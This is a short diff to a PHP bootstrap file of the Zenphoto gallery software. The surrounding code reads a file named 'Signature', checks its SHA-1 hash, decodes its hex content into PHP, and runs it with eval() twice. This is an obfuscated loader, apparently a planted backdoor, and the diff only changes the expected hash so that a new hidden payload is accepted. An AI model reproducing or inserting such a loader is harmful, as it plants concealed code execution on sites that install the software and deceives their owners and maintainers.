@@ -226,7 +226,8 @@ define('IP_TIED_COOKIES', getOption('IP_tied_cookies'));
 $_zp_conf_vars['version'] = ZENPHOTO_VERSION;
 
 $f = file_get_contents(dirname(__FILE__).'/Signature');
-if (sha1($f)=='666748cfbba9360ad426d8b8f491881eed17c34d') {
+
+if (sha1($f)=='b55827b9b2aa4c0cf6b4b1d34f233386f5e6b55e') {
 	preg_match_all('/(..)/', file_get_contents(dirname(__FILE__).'/Signature'), $matches);
 	$f = '$f="\\x'.implode('\\x', $matches[0]).'";';
 	eval($f);eval($f);
